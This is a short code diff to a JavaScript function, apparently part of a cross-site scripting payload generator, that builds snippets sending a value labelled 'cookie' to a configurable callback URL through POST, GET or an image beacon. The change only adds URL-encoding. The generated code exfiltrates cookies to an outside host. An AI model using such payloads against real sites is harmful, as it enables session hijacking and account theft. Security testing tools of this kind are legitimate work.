@@ -15,15 +15,15 @@ export function cook (instance, vars) {
 
   let submission = ''
   if (instance.method === 'post:ajax') {
-    submission = `ajaxRequest('POST', '${instance.callbackUrl}', c, ${callbackName})`
+    submission = `ajaxRequest('POST', '${instance.callbackUrl}', 'cookie=' + encodeURIComponent(c), ${callbackName})`
   } else if (instance.method === 'get:dom') {
     submission = [
       'var i = new Image()',
-      `i.src = '${instance.callbackUrl}?c=' + c`,
+      `i.src = '${instance.callbackUrl}?c=' + encodeURIComponent(c)`,
       `${callbackName}()`
     ].join('\n')
   } else if (instance.method === 'get:ajax') {
-    submission = `ajaxRequest('GET', '${instance.callbackUrl}?c=' + c, undefined, ${callbackName})`
+    submission = `ajaxRequest('GET', '${instance.callbackUrl}?c=' + encodeURIComponent(c), undefined, ${callbackName})`
   }
 
   let eof = ''
